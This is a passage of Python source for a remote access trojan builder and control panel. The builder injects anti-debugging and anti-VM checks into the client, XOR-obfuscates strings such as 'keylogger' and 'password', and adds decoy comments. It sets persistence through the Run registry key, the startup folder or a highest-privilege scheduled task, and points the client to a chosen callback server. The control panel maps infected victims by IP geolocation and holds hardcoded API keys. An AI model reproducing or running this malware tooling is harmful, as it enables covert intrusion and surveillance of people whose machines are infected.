    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        sys.exit(0)
        
    try:
        if sys.platform == 'win32':
            is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
            if is_debugged:
                sys.exit(0)
    except:
        pass

    # Check for debugger periodically
    import threading
    def _periodic_check():
        while True:
            _check_debugger()
            time.sleep(30)
            
    threading.Thread(target=_periodic_check, daemon=True).start()
_check_debugger()
    """
                
                # Add the anti-debug code near the top after imports
                import_section_end = 0
                for line_idx, line in enumerate(code.split('\n')):
                    if not line.strip().startswith(('import ', 'from ')) and import_section_end > 5:
                        break
                    import_section_end = line_idx + 1
                
                code_lines = code.split('\n')
                code_lines.insert(import_section_end, anti_debug_code)
                code = '\n'.join(code_lines)
                
                # Add simple XOR encryption for sensitive strings
                xor_function = """
def _x(s, k=13):
    return ''.join(chr(ord(c) ^ k) for c in s)
    """
                code = xor_function + code
                
                # Replace some sensitive strings with XOR encrypted versions
                sensitive_strings = [
                    "127.0.0.1", "localhost", "socket", "connect", "screenshot", 
                    "keylogger", "audio", "command", "process", "network", "browser",
                    "cookie", "password", "clipboard"
                ]
                
                for string in sensitive_strings:
                    if f'"{string}"' in code:
                        # XOR encrypt the string
                        encrypted = ''.join(chr(ord(c) ^ 13) for c in string)
                        code = code.replace(f'"{string}"', f'_x("{encrypted}")')
                
                # Add multiple layers of junk code and misleading comments
                junk_code = [
                    '\n# Firewall configuration manager',
                    '\n# System performance optimizer',
                    '\n# Connection pooling service',
                    '\n# Database connector initialization',
                    '\n# Certificate validation module',
                    '\n# Network drive mapper',
                    '\n# Print job manager'
                ]
                
                for junk in junk_code:
                    # Insert at random positions
                    lines = code.split('\n')
                    pos = random.randint(10, len(lines) - 10)
                    lines.insert(pos, junk)
                    code = '\n'.join(lines)
                
            return code
        
        except Exception as e:
            self.log_message(f"Error during obfuscation: {e}", is_error=True)
            # If obfuscation fails, return original code
            return original_code
            
    def customize_client_code(self):
        """Customize the client code with current settings"""
        self.log_message("Customizing client code...")
        import re
        # Start with the template
        code = self.client_code
        
        # Replace server connection settings
        code = code.replace('SERVER_IP = "127.0.0.1"', f'SERVER_IP = "{self.build_options["host"]}"')
        code = code.replace('SERVER_PORT = 4444', f'SERVER_PORT = {self.build_options["port"]}')
        
        # def fix_escape_sequences(match):
        #     """Replace invalid escape sequences"""
        #     full_match = match.group(0)
            
        #     # List of valid escape sequences
        #     valid_escapes = ['\\n', '\\t', '\\r', '\\b', '\\f', '\\\\', '\\"', '\\\'']
            
        #     # If it's not a valid escape, replace the backslash
        #     if full_match not in valid_escapes:
        #         print(f"Fixing invalid escape sequence: {full_match}")
        #         return full_match.replace('\\', r'\\')
            
        #     return full_match
        
        # try:
        #     code = re.sub(r'\\[^ntrbf\\\'"()]', fix_escape_sequences, code)
        # except Exception as e:
        #     self.log_message(f"Error fixing escape sequences: {e}", is_error=True)
        
        try:
            code = code.encode('utf-8', errors='ignore').decode('utf-8')
        except Exception as e:
            self.log_message(f"Error encoding code: {e}", is_error=True)
            
        # Configure stealth options
        hide_console = str(self.build_options["hide_console"])
        persistence = str(self.build_options["persistence"])
        add_to_startup = persistence
        
        # If it has this configuration section, modify it
        if "# Configuration" in code and "HIDE_CONSOLE = False" in code:
            code = code.replace('HIDE_CONSOLE = False', f'HIDE_CONSOLE = {hide_console}')
            code = code.replace('ADD_TO_STARTUP = False', f'ADD_TO_STARTUP = {add_to_startup}')
            
            if self.build_options["anti_vm"]:
                code = code.replace('REQUEST_ADMIN = False', 'REQUEST_ADMIN = True')
        else:
            # Otherwise we'll need to add the configuration
            config_code = f'''
# Configuration
HIDE_CONSOLE = {hide_console}  # Set to True to hide console window
ADD_TO_STARTUP = {add_to_startup}  # Set to True to add to startup
REQUEST_ADMIN = {str(self.build_options["anti_vm"])}  # Set to True to request admin privileges
'''
            # Insert after imports if possible
            if "import" in code:
                # Find the last import statement
                lines = code.split('\n')
                last_import_idx = 0
                for i, line in enumerate(lines):
                    if line.strip().startswith(('import ', 'from ')):
                        last_import_idx = i
                
                # Insert after the last import
                lines.insert(last_import_idx + 1, config_code)
                code = '\n'.join(lines)
            else:
                # Just add at the beginning if we can't find imports
                code = config_code + code
        
        # Customize persistence method if enabled
        if self.build_options["persistence"]:
            method = self.build_options["persistence_method"]
            startup_name = self.build_options["startup_name"]
            
            # Add or modify persistence code
            if "def run_on_startup():" in code:
                # Replace the existing startup method
                if method == "registry":
                    persistence_code = fr'''
    try:
        if os.name == 'nt':  # Windows
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Add to registry for startup
            import winreg
            key_path = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "{startup_name}", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            
        print("[*] Added to startup successfully")
        
    except Exception as e:
        print(f"[!] Error adding to startup: {{e}}")'''
                
                elif method == "startup_folder":
                    persistence_code = rf'''
    try:
        if os.name == 'nt':  # Windows
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Copy to startup folder
            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            startup_file = os.path.join(startup_folder, "{startup_name}.lnk")
            
            # Create shortcut
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(startup_file)
            shortcut.Targetpath = script_path
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.IconLocation = script_path
            shortcut.save()
            
        print("[*] Added to startup folder successfully")
        
    except Exception as e:
        print(f"[!] Error adding to startup folder: {{e}}")'''
                
                elif method == "scheduled_task":
                    persistence_code = rf'''
    try:
        if os.name == 'nt':  # Windows
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Create scheduled task
            task_name = "{startup_name}"
            os.system(f'schtasks /create /tn "{{task_name}}" /sc onlogon /tr "{{script_path}}" /rl highest /f')
            
        print("[*] Added scheduled task successfully")
        
    except Exception as e:
        print(f"[!] Error adding scheduled task: {{e}}")'''
                
                # Replace the function content
                import re
                code = re.sub(r'def run_on_startup\(\):.*?(?=\n[a-zA-Z]|\n\s*$|\Z)', 
                             f'def run_on_startup():{persistence_code}\n\n', 
                             code, 
                             flags=re.DOTALL)
        
        # Add mutex if requested
        if self.build_options["mutex_enabled"]:
            mutex_name = self.build_options["mutex_name"]
            
            # Check if main function exists and add mutex code
            if "if __name__ == \"__main__\":" in code:
                mutex_code = rf'''
    # Check for existing instance with mutex
    if os.name == 'nt':  # Windows
        mutex = ctypes.windll.kernel32.CreateMutexA(None, False, b"{mutex_name}")
        if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            print("Another instance is already running. Exiting.")
            sys.exit(0)
'''
                # Insert mutex code at the beginning of main block
                code = code.replace("if __name__ == \"__main__\":", 
                                   f"if __name__ == \"__main__\":{mutex_code}")
            
        # Add anti-VM code if requested
        if self.build_options["anti_vm"]:
            anti_vm_code = r'''
def is_running_in_vm():
    try:
        if os.name == 'nt':  # Windows
            import winreg
            
            vm_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\VBoxService"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\vmtools"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0")
            ]
            
            for root_key, key_path in vm_keys:
                try:
                    key = winreg.OpenKey(root_key, key_path)
                    winreg.CloseKey(key)
                    return True
                except:
                    pass
                    
            vm_processes = ["vboxservice.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmusrvc.exe"]
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in vm_processes:
                        return True
                except:
                    pass
                    
        if os.path.exists("/.dockerenv") or os.path.exists("/proc/self/cgroup"):
            with open("/proc/self/cgroup", "r") as f:
                if "docker" in f.read():
                    return True
        
        return False
    except:
        return False

'''
            
            if "def main()" in code:
                lines = code.split('\n')
                main_idx = 0
                for i, line in enumerate(lines):
                    if line.strip().startswith(('def main()')):
                        last_import_idx = i
                
                # Insert after the last import
                lines.insert(last_import_idx - 1, anti_vm_code)
                code = '\n'.join(lines)
            
            # Add check in main
            if "if __name__ == \"__main__\":" in code:
                anti_vm_check = r'''
    # Exit if running in VM
    if is_running_in_vm():
        print("Running in virtual environment. Exiting.")
        sys.exit(0)
'''
                # Insert anti-VM check at the beginning of main block
                if "# Check for existing instance with mutex" in code:
                    # Add after mutex check
                    code = code.replace("# Check for existing instance with mutex",
                                       f"# Check for existing instance with mutex{anti_vm_check}")
                else:
                    # Add at beginning of main block
                    code = code.replace("if __name__ == \"__main__\":", 
                                       f"if __name__ == \"__main__\":{anti_vm_check}")
        
        return code
        
    def comment_out_section(self, code, start_marker, end_marker):
        """Comment out a section of code based on markers"""
        lines = code.split('\n')
        in_section = False
        indentation = ""
        modified_lines = []
        
        for line in lines:
            # Check if we're entering the section
            if not in_section and start_marker in line:
                in_section = True
                indentation = " " * (len(line) - len(line.lstrip()))
                
                # Add commented version
                modified_lines.append(f"{indentation}# {line.lstrip()}")
            # Check if we're exiting the section
            elif in_section and end_marker in line:
                modified_lines.append(f"{indentation}# {line.lstrip()}")
                
                # Check if this is a class/function definition
                if line.strip().startswith(("def ", "class ")):
                    # Add an empty implementation
                    if "def " in line:
                        # For functions
                        modified_lines.append(f"{indentation}def {line.split('def ')[1].split('(')[0]}(*args, **kwargs):")
                        modified_lines.append(f"{indentation}    pass")
                    else:
                        # For classes
                        modified_lines.append(f"{indentation}class {line.split('class ')[1].split('(')[0]}:")
                        modified_lines.append(f"{indentation}    def __init__(self, *args, **kwargs):")
                        modified_lines.append(f"{indentation}        pass")
                
                in_section = False
            # We're inside the section to comment out
            elif in_section:
                modified_lines.append(f"{indentation}# {line.lstrip()}")
            # Outside any section to comment
            else:
                modified_lines.append(line)
        
        return '\n'.join(modified_lines)


class EnhancedClientGeoMapping:
    """Enhanced geographic mapping component for RAT clients with improved precision"""
    
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.client_locations = {}  # Store client locations {client_id: {"lat": lat, "lon": lon, "info": {...}}}
        self.ip_cache = {}  # Cache for IP->location lookups
        self.cache_expiry = {}  # Store expiration times for cached IPs
        
        # Default cache expiration (24 hours in seconds)
        self.cache_expiration_time = 86400
        
        # API keys for geolocation services
        # Note: These are placeholders - you'll need to sign up for these services
        self.ipstack_api_key = "0c84ae78bf00f2eeb7280af1803f93d5"  
        self.ipinfo_token = "58950d8a1c1383"
        self.ipgeolocation_api_key = "df6c850929e54ae1801e2472127b1a8c"
        self.ipapi_key = "YOUR_IPAPI_KEY"
        
        # Additional options
        self.allow_local_ip_lookup = True  # Set to False to disable public IP lookup for local IPs
        self.debug = True  # Enable debug output for troubleshooting
        self.use_https = True  # Use HTTPS for API requests (more secure)
        self.precision_threshold = 1000  # City-level precision in meters
        
        # Location confidence levels
        self.confidence_levels = {
            "high": 3,    # Multiple sources agree, precision data available
            "medium": 2,  # Single trusted source with good precision
            "low": 1,     # Best-effort location (approximate)
            "unknown": 0  # Default, no reliable data
        }
        
        # Initialize services status to track API availability
        self.services_status = {
            "ipstack": {"available": True, "last_error": None, "error_count": 0},
            "ipinfo": {"available": True, "last_error": None, "error_count": 0},
            "ipgeolocation": {"available": True, "last_error": None, "error_count": 0},
            "ipapi": {"available": True, "last_error": None, "error_count": 0},
            "freegeoip": {"available": True, "last_error": None, "error_count": 0}
        }
        
        # Setup the UI
        self.setup_ui()
        
        # Initialize requests library
        try:
            import requests
            self.requests_available = True
        except ImportError:
            self.requests_available = False
            self.log_message("Warning: requests library not available. Using fallback HTTP methods.", is_error=True)

    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return self.rat_app.THEMES[theme_name]
            
    def setup_ui(self):
        """Set up the geographic mapping tab UI"""
        # Import required modules
        import tkinter as tk
        import customtkinter as ctk
        from tkinter import ttk
        import os
        import json
        
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Create main frame for the map tab
        self.map_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.map_frame, text="Geographic Map")
        
        # Control panel at the top
        control_frame = ctk.CTkFrame(self.map_frame, fg_color=theme["card_color"], corner_radius=10)
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Map refresh button
        refresh_btn = ctk.CTkButton(control_frame, text="Refresh Map", 
                                  command=self.refresh_map,
                                  fg_color=theme["button_color"],
                                  hover_color=theme["hover_color"])
        refresh_btn.pack(side=tk.LEFT, padx=10, pady=10)
        
        # Precision scan button - New!
        precision_btn = ctk.CTkButton(control_frame, text="Precision Scan", 
                                   command=self.perform_precision_scan,
                                   fg_color=theme["button_color"],
                                   hover_color=theme["hover_color"])
        precision_btn.pack(side=tk.LEFT, padx=10, pady=10)
        
        # Map provider selection
        provider_label = ctk.CTkLabel(control_frame, text="Map Provider:")
        provider_label.pack(side=tk.LEFT, padx=(20, 5), pady=10)
        
        self.provider_var = tk.StringVar(value="OpenStreetMap")
        provider_menu = ctk.CTkOptionMenu(control_frame, values=["OpenStreetMap", "Mapbox", "Google Maps", "ESRI"],
                                        variable=self.provider_var,
                                        command=self.change_map_provider,
                                        fg_color=theme["button_color"],
                                        button_color=theme["button_color"],
                                        button_hover_color=theme["hover_color"])
        provider_menu.pack(side=tk.LEFT, padx=5, pady=10)
        
        # Map type selection (satellite, street, hybrid)
        type_label = ctk.CTkLabel(control_frame, text="Map Type:")
        type_label.pack(side=tk.LEFT, padx=(20, 5), pady=10)
        
        self.map_type_var = tk.StringVar(value="Street")
        type_menu = ctk.CTkOptionMenu(control_frame, values=["Street", "Satellite", "Hybrid", "Terrain"],
                                     variable=self.map_type_var,
                                     command=self.change_map_type,
                                     fg_color=theme["button_color"],
                                     button_color=theme["button_color"],
                                     button_hover_color=theme["hover_color"])
        type_menu.pack(side=tk.LEFT, padx=5, pady=10)
        
        # Geolocation options - New! 
        geo_options_frame = ctk.CTkFrame(control_frame, fg_color="transparent")
        geo_options_frame.pack(side=tk.RIGHT, padx=10, pady=10)
        
        # Precision level selection
        precision_label = ctk.CTkLabel(geo_options_frame, text="Precision Level:")
        precision_label.pack(side=tk.LEFT, padx=5)
        
        self.precision_var = tk.StringVar(value="Standard")
        precision_menu = ctk.CTkOptionMenu(geo_options_frame, values=["High", "Standard", "Approximate"],
                                         variable=self.precision_var,
                                         command=self.change_precision_level,
                                         fg_color=theme["button_color"],
                                         button_color=theme["button_color"],
                                         button_hover_color=theme["hover_color"])
        precision_menu.pack(side=tk.LEFT, padx=5)
        
        # Local IP handling options
        self.local_ip_var = tk.BooleanVar(value=self.allow_local_ip_lookup)
        local_ip_check = ctk.CTkCheckBox(geo_options_frame, text="Resolve local IPs", 
                                        variable=self.local_ip_var,
                                        command=self.toggle_local_ip_lookup,
                                        fg_color=theme["accent_color"])
        local_ip_check.pack(side=tk.LEFT, padx=10)
        
        # Main map display area
        self.map_container = ctk.CTkFrame(self.map_frame, fg_color=theme["card_color"], corner_radius=10)
        self.map_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # We'll set up the map differently depending on the library used
        try:
            import tkintermapview
            self.setup_tkinter_map()
            self.map_type = "tkinter"
        except ImportError:
            # Show a message about the missing library
            missing_lib_frame = ctk.CTkFrame(self.map_container, fg_color=theme["bg_color"])
            missing_lib_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
            
            message_label = ctk.CTkLabel(
                missing_lib_frame, 
                text="The tkintermapview library is not installed.\nPlease install it using:\npip install tkintermapview",
                font=ctk.CTkFont(size=14),
                justify=tk.CENTER
            )
            message_label.pack(fill=tk.BOTH, expand=True)
            
            install_btn = ctk.CTkButton(
                missing_lib_frame, 
                text="Try Web-based Map Instead", 
                command=self.setup_web_map,
                fg_color=theme["accent_color"],
                hover_color=theme["hover_color"]
            )
            install_btn.pack(pady=20)
            
            self.map_type = "none"
        
        # Client information panel
        info_frame = ctk.CTkFrame(self.map_frame, fg_color=theme["card_color"], corner_radius=10, height=200)
        info_frame.pack(fill=tk.X, padx=10, pady=10)
        info_frame.pack_propagate(False)  # Prevent the frame from shrinking
        
        # Create a notebook for multiple info tabs
        self.info_notebook = ttk.Notebook(info_frame, style="Custom.TNotebook")
        self.info_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Basic info tab
        basic_info_frame = ctk.CTkFrame(self.info_notebook, fg_color=theme["bg_color"])
        self.info_notebook.add(basic_info_frame, text="Basic Info")
        
        self.client_info_text = tk.Text(basic_info_frame, height=8, wrap=tk.WORD, 
                                     bg=theme["bg_color"], fg=theme["fg_color"],
                                     borderwidth=0, highlightthickness=0)
        self.client_info_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.client_info_text.insert(tk.END, "Select a client marker on the map to view details.")
        self.client_info_text.config(state=tk.DISABLED)
        
        # Advanced location tab
        location_info_frame = ctk.CTkFrame(self.info_notebook, fg_color=theme["bg_color"])
        self.info_notebook.add(location_info_frame, text="Location Details")
        
        self.location_info_text = tk.Text(location_info_frame, height=8, wrap=tk.WORD, 
                                       bg=theme["bg_color"], fg=theme["fg_color"],
                                       borderwidth=0, highlightthickness=0)
        self.location_info_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.location_info_text.insert(tk.END, "Detailed location information will appear here.")
        self.location_info_text.config(state=tk.DISABLED)
        
        # Status log tab
        log_frame = ctk.CTkFrame(self.info_notebook, fg_color=theme["bg_color"])
        self.info_notebook.add(log_frame, text="Location Log")
        
        self.log_text = tk.Text(log_frame, height=8, wrap=tk.WORD, 
                             bg=theme["bg_color"], fg=theme["fg_color"],
                             borderwidth=0, highlightthickness=0)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text.insert(tk.END, "Geolocation status logs will appear here.")
        self.log_text.config(state=tk.DISABLED)
        
        # Register with theme manager if available
        self.register_with_theme_manager()
    
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register main frames
            tm.track_widget(self.map_frame)
            tm.track_widget(self.map_container)
            
            # Register notebook
            tm.track_widget(self.info_notebook, "notebook")
            
            # Other widgets will be registered as needed
    
    def setup_tkinter_map(self):
        """Set up the map using tkintermapview library with enhanced features"""
        import tkintermapview
        
        # Create the map widget
        self.map_widget = tkintermapview.TkinterMapView(self.map_container, width=800, height=600, 
                                                     corner_radius=0)
        self.map_widget.pack(fill="both", expand=True)
        
        # Set default position (world view)
        self.map_widget.set_position(20.0, 0.0)  # Center at equator
        self.map_widget.set_zoom(2)  # Zoom level for world view
        
        # Set up map marker click event
        self.map_widget.add_right_click_menu_command("View Client Details", 
                                                   self.show_client_details,
                                                   pass_coords=True)
        
        # Set up enhanced marker system
        self.markers = {}  # Store references to markers for updates
        
        # Add menu commands for enhanced functionality
        self.map_widget.add_right_click_menu_command("Get Precise Location", 
                                                   self.get_precise_location,
                                                   pass_coords=True)
        self.map_widget.add_right_click_menu_command("Copy Coordinates", 
                                                   self.copy_coordinates,
                                                   pass_coords=True)
    
    def setup_web_map(self):
        """Set up the map using a web-based approach with tkinter HTML viewer"""
        import tkinter as tk
        
        try:
            from tkinterweb import HtmlFrame
            
            # Create HTML frame
            self.html_frame = HtmlFrame(self.map_container, messages_enabled=False)
            self.html_frame.pack(fill="both", expand=True)
            
            # Generate and load a basic map with leaflet.js
            map_html = self.generate_web_map_html()
            self.html_frame.load_html(map_html)
            self.map_type = "web"
            
        except ImportError:
            # Show error message if tkinterweb is not available
            error_label = tk.Label(self.map_container, text="Map libraries not available.\nPlease install tkintermapview or tkinterweb.", 
                                  justify=tk.CENTER)
            error_label.pack(fill=tk.BOTH, expand=True)
            self.map_type = "none"
    
    def generate_web_map_html(self):
        """Generate HTML for a web-based map using Leaflet.js with enhanced features"""
        # Base HTML template with Leaflet.js
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Client Location Map</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
            <style>
                body { margin: 0; padding: 0; }
                #map { height: 100vh; width: 100%; }
                .info-window { max-width: 300px; }
                .client-marker { border-radius: 50%; text-align: center; }
                .high-precision { border: 3px solid green; }
                .medium-precision { border: 3px solid yellow; }
                .low-precision { border: 3px solid red; }
            </style>
        </head>
        <body>
            <div id="map"></div>
            <script>
                // Initialize the map
                var map = L.map('map').setView([20, 0], 2);
                
                // Add the tile layer (OpenStreetMap by default)
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }).addTo(map);
                
                // Add circle for accuracy visualization
                function addAccuracyCircle(lat, lng, accuracy, client_id) {
                    var circle = L.circle([lat, lng], {
                        color: accuracy < 1000 ? 'green' : accuracy < 5000 ? 'yellow' : 'red',
                        fillColor: accuracy < 1000 ? 'green' : accuracy < 5000 ? 'yellow' : 'red',
                        fillOpacity: 0.1,
                        radius: accuracy || 10000
                    }).addTo(map);
                    
                    // Store circle reference for updates
                    window['circle_' + client_id] = circle;
                }
                
                // Add client markers
                """
        
        # Add client markers to the map with enhanced features
        for client_id, location in self.client_locations.items():
            if 'lat' in location and 'lon' in location:
                # Skip if coordinates are invalid (0,0 usually indicates failed geolocation)
                if location['lat'] == 0 and location['lon'] == 0:
                    continue
                
                # Create a popup with client info
                info = location.get('info', {})
                ip = info.get('ip', 'Unknown')
                hostname = info.get('hostname', 'Unknown')
                location_name = info.get('location', 'Unknown')
                accuracy = info.get('accuracy', 10000)  # Default to 10km if unknown
                confidence = info.get('confidence', 'low')
                
                # Determine marker color based on confidence
                if confidence == 'high':
                    color = 'green'
                elif confidence == 'medium':
                    color = 'orange'
                else:
                    color = 'red'
                
                # Add enhanced marker with detailed popup
                html += f"""
                var marker_{client_id} = L.marker([{location['lat']}, {location['lon']}], {{
                    icon: L.divIcon({{
                        className: 'client-marker {confidence}-precision',
                        html: '<div style="background-color: {color}; width: 12px; height: 12px; border-radius: 50%;"></div>',
                        iconSize: [12, 12],
                        iconAnchor: [6, 6]
                    }})
                }}).addTo(map);
                
                marker_{client_id}.bindPopup(`
                    <div class="info-window">
                        <h3>Client ID: {client_id}</h3>
                        <p><strong>IP:</strong> {ip}</p>
                        <p><strong>Hostname:</strong> {hostname}</p>
                        <p><strong>Location:</strong> {location_name}</p>
                        <p><strong>Precision:</strong> {confidence.title()}</p>
                        <p><strong>Coordinates:</strong> {location['lat']:.6f}, {location['lon']:.6f}</p>
                    </div>
                `);
                
                addAccuracyCircle({location['lat']}, {location['lon']}, {accuracy}, {client_id});
                """
        
        # Add functions for interaction
        html += """
                // Function to zoom to a location
                function zoomToLocation(lat, lng, zoom) {
                    map.setView([lat, lng], zoom || 12);
                }
                
                // Function to update a marker
                function updateMarker(client_id, lat, lng, accuracy, popupContent) {
                    var marker = window['marker_' + client_id];
                    var circle = window['circle_' + client_id];
                    
                    if (marker) {
                        marker.setLatLng([lat, lng]);
                        if (popupContent) {
                            marker.bindPopup(popupContent);
                        }
                    }
                    
                    if (circle) {
                        circle.setLatLng([lat, lng]);
                        circle.setRadius(accuracy || 10000);
                        
                        // Update circle color based on accuracy
                        var color = accuracy < 1000 ? 'green' : accuracy < 5000 ? 'yellow' : 'red';
                        circle.setStyle({
                            color: color,
                            fillColor: color
                        });
                    }
                }
            </script>
        </body>
        </html>
        """
        
        return html
    
    def perform_precision_scan(self):
        """Performs a precision scan to improve location accuracy for all clients"""
        import threading
        
        self.log_message("Starting precision scan for all clients...")
        
        # Get all connected clients and schedule precision scans
        for client_id, location in list(self.client_locations.items()):
            if 'info' not in location or 'ip' not in location['info']:
                continue
                
            ip = location['info']['public_ip']
            
            # Start a thread for each client to avoid blocking the UI
            thread = threading.Thread(
                target=self.get_precise_location_for_ip,
                args=(ip, client_id, True)
            )
            thread.daemon = True
            thread.start()
    
    def get_precise_location_for_ip(self, ip, client_id, update_map=True):
        """Get high-precision location data for an IP address"""
        try:
            self.log_message(f"Performing precision scan for client {client_id} ({ip})...")
            
            # Try multiple services and combine results for higher precision
            location_data = []
            confidence = "low"
            accuracy = 10000  # Default 10km radius
            
            # Try all available services
            ipstack_data = self.get_ipstack_location(ip)
            if ipstack_data and self.is_valid_location(ipstack_data):
                location_data.append(ipstack_data)
                
            ipinfo_data = self.get_ipinfo_location(ip)
            if ipinfo_data and self.is_valid_location(ipinfo_data):
                location_data.append(ipinfo_data)
                
            ipgeo_data = self.get_ipgeolocation_location(ip)
            if ipgeo_data and self.is_valid_location(ipgeo_data):
                location_data.append(ipgeo_data)
                
            ipapi_data = self.get_ipapi_location(ip)
            if ipapi_data and self.is_valid_location(ipapi_data):
                location_data.append(ipapi_data)
            
            # If we have multiple data sources, check for consensus
            if len(location_data) >= 3:
                # Compare coordinates between sources for consistency
                avg_lat, avg_lon, data_variance = self.calculate_location_consensus(location_data)
                
                if data_variance < 0.01:  # Locations agree closely
                    confidence = "high"
                    accuracy = self.get_best_accuracy(location_data)
                    self.log_message(f"High confidence location for {ip}: consensus between {len(location_data)} sources")
                else:
                    confidence = "medium"
                    accuracy = 5000  # ~5km radius
                    self.log_message(f"Medium confidence location for {ip}: sources disagree slightly")
            
            elif len(location_data) >= 1:
                # Single data source
                avg_lat = location_data[0].get('latitude')
                avg_lon = location_data[0].get('longitude')
                confidence = "medium"
                accuracy = self.get_best_accuracy(location_data)
                self.log_message(f"Medium confidence location for {ip}: single source with {accuracy}m accuracy")
            
            else:
                # No good data
                self.log_message(f"Could not obtain precise location for {ip}", is_error=True)
                return
            
            # Find the best location info (most complete)
            best_location_info = self.get_most_complete_location_info(location_data)
            
            # Update the client location with improved data
            if client_id in self.client_locations:
                self.client_locations[client_id]["lat"] = avg_lat
                self.client_locations[client_id]["lon"] = avg_lon
                
                # Update info
                if 'info' not in self.client_locations[client_id]:
                    self.client_locations[client_id]["info"] = {}
                
                self.client_locations[client_id]["info"]["confidence"] = confidence
                self.client_locations[client_id]["info"]["accuracy"] = accuracy
                
                # Add detailed location info
                for key in best_location_info:
                    if key not in ['latitude', 'longitude']:
                        self.client_locations[client_id]["info"][key] = best_location_info[key]
                
                # Update location string
                location_parts = []
                if best_location_info.get('city'):
                    location_parts.append(best_location_info['city'])
                if best_location_info.get('region_name'):
                    location_parts.append(best_location_info['region_name'])
                if best_location_info.get('country_name'):
                    location_parts.append(best_location_info['country_name'])
                
                if location_parts:
                    self.client_locations[client_id]["info"]["location"] = ", ".join(location_parts)
                
                # Update the cache
                self.ip_cache[ip] = self.client_locations[client_id].copy()
                
                # Update map if requested
                if update_map:
                    self.refresh_map()
                
                self.log_message(f"Updated location for {ip} with {confidence} confidence")
                
        except Exception as e:
            self.log_message(f"Error in precision scan for {ip}: {e}", is_error=True)
    
    def get_best_accuracy(self, location_data_list):
        """Get the best accuracy value from multiple location sources"""
        best_accuracy = 10000  # Default 10km
        
        for data in location_data_list:
            accuracy = data.get('accuracy', 10000)
            if accuracy and accuracy < best_accuracy:
                best_accuracy = accuracy
        
        return best_accuracy
    
    def calculate_location_consensus(self, location_data_list):
        """Calculate average location and variance from multiple data sources"""
        # Extract all lat/lon pairs
        coordinates = []
        for data in location_data_list:
            lat = data.get('latitude')
            lon = data.get('longitude')
            if lat is not None and lon is not None:
                coordinates.append((lat, lon))
        
        if not coordinates:
            return 0, 0, 999
            
        # Calculate average
        avg_lat = sum(coord[0] for coord in coordinates) / len(coordinates)
        avg_lon = sum(coord[1] for coord in coordinates) / len(coordinates)
        
        # Calculate variance (measure of agreement between sources)
        import math
        total_variance = 0
        for lat, lon in coordinates:
            # Simplified distance calculation (not accounting for Earth's curvature)
            variance = math.sqrt((lat - avg_lat)**2 + (lon - avg_lon)**2)
            total_variance += variance
            
        avg_variance = total_variance / len(coordinates) if coordinates else 999
        
        return avg_lat, avg_lon, avg_variance
    
    def get_most_complete_location_info(self, location_data_list):
        """Find the most complete location info entry from available sources"""
        if not location_data_list:
            return {}
            
        # Use a scoring system to determine the most complete entry
        best_score = -1
        best_data = None
        
        for data in location_data_list:
            score = 0
            
            # Check for presence of important fields
            important_fields = [
                'city', 'region_name', 'country_name', 'zip', 
                'isp', 'timezone', 'accuracy'
            ]
            
            for field in important_fields:
                if field in data and data[field]:
                    score += 1
            
            # Extra points for accuracy information
            if 'accuracy' in data and data['accuracy'] < 5000:
                score += 2
                
            if score > best_score:
                best_score = score
                best_data = data
        
        return best_data or location_data_list[0]
    
    def is_valid_location(self, location_data):
        """Check if location data contains valid coordinates"""
        if not location_data:
            return False
            
        lat = location_data.get('latitude')
        lon = location_data.get('longitude')
        
        # Check if coordinates exist and are not 0,0 (often indicates failed lookup)
        if lat is None or lon is None:
            return False
            
        if lat == 0 and lon == 0:
            return False
            
        # Check if coordinates are within valid range
        if abs(lat) > 90 or abs(lon) > 180:
            return False
            
        return True
    
    def get_precise_location(self, coordinates=None):
        """Get precise location for client nearest to the given coordinates"""
        if not coordinates:
            return
            
        lat, lon = coordinates
        client_id = self.find_closest_client(lat, lon)
        
        if client_id is None:
